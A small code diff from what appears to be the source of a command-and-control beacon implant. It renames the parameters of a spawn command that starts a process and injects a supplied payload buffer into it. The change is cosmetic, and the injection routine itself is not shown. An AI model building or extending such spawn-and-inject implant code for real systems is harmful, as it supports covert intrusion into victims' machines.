@@ -3,7 +3,7 @@
 #include "Api.h"
 #include "Command.h"
 
-VOID CmdSpawn(unsigned char* commandBuf, size_t commandBuflen, BOOL x86, BOOL ignoreToken)
+VOID CmdSpawn(unsigned char* command, size_t command_length, BOOL x86, BOOL ignoreToken)
 {
 	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
 	PROCESS_INFORMATION pi = { 0 };
@@ -22,7 +22,7 @@ VOID CmdSpawn(unsigned char* commandBuf, size_t commandBuflen, BOOL x86, BOOL ig
 	}
 
 	Sleep(100);
-	InjectProcessLogic(&pi, pi.hProcess, pi.dwProcessId, commandBuf, commandBuflen, 0, NULL, 0);
+	InjectProcessLogic(&pi, pi.hProcess, pi.dwProcessId, command, command_length, 0, NULL, 0);
 
 	BeaconCleanupProcess(&pi);
 }
